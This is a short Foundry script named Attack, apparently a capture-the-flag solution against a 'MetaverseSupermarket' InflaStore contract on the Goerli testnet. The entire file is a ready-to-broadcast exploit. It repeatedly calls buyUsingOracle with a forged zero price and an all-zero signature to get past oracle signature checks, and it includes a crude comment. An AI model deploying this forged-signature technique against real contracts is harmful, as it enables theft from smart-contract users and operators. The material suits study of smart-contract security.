
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

import {InflaStore, OraclePrice, Signature} from "./MetaverseSupermarket.sol";

/// @dev forge script script/Attack.s.sol:Attack --rpc-url $ETH_GOERLI_RPC_URL --broadcast

contract Attack is Script {
  
  function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        InflaStore store = InflaStore(0xa40aC54a46022Bc4f34750Fe4455833B453cE271);

        OraclePrice memory price = OraclePrice({
            blockNumber: block.number,
            price: 0
        });

        Signature memory signature = Signature({v: 27, r: bytes32(0), s: bytes32(0)});


        vm.startBroadcast(deployerPrivateKey);
        for(uint256 i = 0; i < 3; i++) {
          // fill me daddy
          store.buyUsingOracle(price, signature);
        }
        vm.stopBroadcast();
  }
   
}
